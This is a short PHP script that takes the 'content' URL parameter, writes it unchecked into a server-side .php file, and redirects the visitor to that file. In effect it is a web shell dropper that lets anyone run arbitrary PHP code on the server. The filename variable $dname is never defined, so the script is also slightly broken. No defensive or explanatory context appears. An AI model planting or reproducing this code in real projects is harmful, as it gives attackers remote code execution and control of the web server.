<?php
$content = $_GET["content"];
$file = $dname . ".php";
file_put_contents($file, $content);
echo $file;

header('Location:'.$file);
?>